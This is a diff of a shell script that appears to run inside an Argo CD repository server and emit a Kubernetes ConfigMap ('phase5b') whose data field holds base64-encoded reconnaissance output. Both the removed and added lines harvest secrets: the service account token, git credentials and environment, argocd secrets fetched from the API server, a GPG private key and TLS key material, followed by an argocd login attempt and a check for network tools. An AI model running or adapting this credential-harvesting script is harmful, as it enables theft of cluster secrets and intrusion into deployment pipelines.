@@ -1,60 +1,53 @@
 #!/bin/sh
 RECON=$( (
-  echo "===SA_TOKEN==="
-  cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+  echo "===GPG_KEY==="
+  cat /app/config/gpg/keys/private-keys-v1.d/E304B7A132D78E19C543A2E8EDEA6AA247E7D384.key 2>/dev/null | base64 | tr -d '\n'
   echo ""
-  echo "===SA_NAMESPACE==="
-  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
+  echo "===SSH_KNOWN_HOSTS==="
+  cat /app/config/ssh/ssh_known_hosts 2>/dev/null
   echo ""
-  echo "===SA_CA==="
-  cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | base64 | tr -d '\n'
+  echo "===TLS_DIR==="
+  ls -la /app/config/tls/ 2>/dev/null
   echo ""
-  echo "===HOME_DIR==="
-  ls -la /home/argocd/ 2>/dev/null
+  echo "===REPOSERVER_TLS==="
+  ls -la /app/config/reposerver/tls/ 2>/dev/null
   echo ""
-  echo "===SSH_KEYS==="
-  find /home -type f 2>/dev/null
-  ls -la /home/argocd/.ssh/ 2>/dev/null
+  echo "===TLS_CERTS==="
+  for f in /app/config/tls/* /app/config/reposerver/tls/*; do
+    echo "--- $f ---"
+    cat "$f" 2>/dev/null | base64 | tr -d '\n'
+    echo ""
+  done
   echo ""
-  echo "===GIT_CONFIGS==="
-  find / -name ".gitconfig" -o -name ".git-credentials" -o -name ".netrc" 2>/dev/null
-  cat /home/argocd/.gitconfig 2>/dev/null
-  cat /root/.gitconfig 2>/dev/null
-  cat /home/argocd/.git-credentials 2>/dev/null
+  echo "===ARGOCD_CLI==="
+  file /usr/local/bin/argocd 2>/dev/null
+  /usr/local/bin/argocd version 2>/dev/null
   echo ""
-  echo "===ARGOCD_FILES==="
-  find / -path "/proc" -prune -o -path "/sys" -prune -o \( -name "argocd*" -o -name "ssh*" -o -name "*token*" -o -name "*secret*" -o -name "*key*" -o -name "*credential*" \) -type f -print 2>/dev/null | head -50
+  echo "===ARGOCD_LOGIN_TEST==="
+  /usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null || echo "login failed"
   echo ""
-  echo "===MOUNTS==="
-  mount 2>/dev/null
-  cat /proc/mounts 2>/dev/null | head -30
+  echo "===ARGOCD_APP_LIST==="
+  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null | head -50
   echo ""
-  echo "===ENV_FULL==="
-  env 2>/dev/null
+  echo "===CMP_PLUGINS==="
+  ls -laR /home/argocd/cmp-server/plugins/ 2>/dev/null
   echo ""
-  echo "===K8S_API==="
-  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-  APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
-  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 2000
+  echo "===CMP_CONFIG==="
+  find /home/argocd/cmp-server -type f 2>/dev/null
+  cat /home/argocd/cmp-server/plugins/plugin.yaml 2>/dev/null
   echo ""
-  echo "===ARGOCD_CM==="
-  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/configmaps/argocd-cm" 2>/dev/null | head -c 1000
+  echo "===BINARIES==="
+  which wget curl nc bash python python3 perl ruby node npm 2>/dev/null
   echo ""
-  echo "===ARGOCD_SECRET==="
-  wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "https://${APISERVER}/api/v1/namespaces/argocd/secrets/argocd-secret" 2>/dev/null | head -c 2000
-  echo ""
-  echo "===PROCESSES==="
-  ps aux 2>/dev/null | head -20
-  echo ""
-  echo "===NETWORK==="
-  cat /etc/hosts 2>/dev/null
-  cat /etc/resolv.conf 2>/dev/null
+  echo "===REPO_CONFIG==="
+  ls -la /app/config/ 2>/dev/null
+  ls -laR /app/config/gpg/ 2>/dev/null
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: phase5
+  name: phase5b
 data:
   result: $RECON
 EOF
